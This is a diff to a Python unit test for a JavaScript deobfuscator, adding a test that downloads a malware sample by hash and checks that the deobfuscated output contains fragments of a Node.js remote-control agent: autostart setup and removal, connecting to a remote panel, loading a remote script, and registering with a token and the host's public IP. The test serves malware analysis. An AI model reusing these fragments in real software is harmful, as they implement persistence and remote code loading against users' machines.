@@ -201,6 +201,65 @@ class TestJsDeobfuscator(TestUnitBase):
         ])
         self.assertNotIn('decodeURIComponent', test)
 
+    def test_double_string_obfuscation(self):
+        data = self.download_sample('6577cce638a8dcbaa931abec340b5b0cbd66a2788d36017a7fbdaf0376add786')
+        test = data | self.load() | str
+        for fragment in [
+            inspect.cleandoc(
+                """
+                function main() {
+                  const D = process.argv[0x2];
+                  if (D === '--uninstall') {
+                    uninstallAutoStart();
+                    return;
+                  }
+                  if (D === '--setup') {
+                    try {
+                      (function(I, S) {
+                        return I(S);
+                      }(runSetupOnly, process.argv.includes('--start')));
+                    } catch {
+                      process.exit(0x1);
+                    }
+                    return;
+                  }
+                  bootstrap();
+                }
+                """
+            ),
+            inspect.cleandoc(
+                """
+                async function onConnected() {
+                  const D = activePanelUrl || await getActivePanelUrl();
+                  try {
+                    await loadRemoteScript(D, config);
+                  } catch {}
+                  runHook('onConnect', getAgentInfo());
+                }
+                function onSocketReady() {
+                  resetReconnectBackoff();
+                  markFirstConnectComplete();
+                  send({ 'type': 'register', 'agent': buildAgentPayload(), 'token': config.token });
+                  armRegisterAckTimer();
+                  startStaleWatchdog();
+                  startHeartbeat();
+                  onConnected().catch(() => {});
+                }
+                """
+            ),
+            inspect.cleandoc(
+                """
+                function buildAgentPayload() {
+                  const D = { ...getAgentInfo(), 'panelUrl': activePanelUrl || null };
+                  if (config.reportClientIp && reportedPublicIp) {
+                    D.reportedIp = reportedPublicIp;
+                  }
+                  return D;
+                }
+                """
+            ),
+        ]:
+            self.assertIn(fragment, test)
 
 class TestJsHostEnvironmentPin(TestUnitBase):
     """
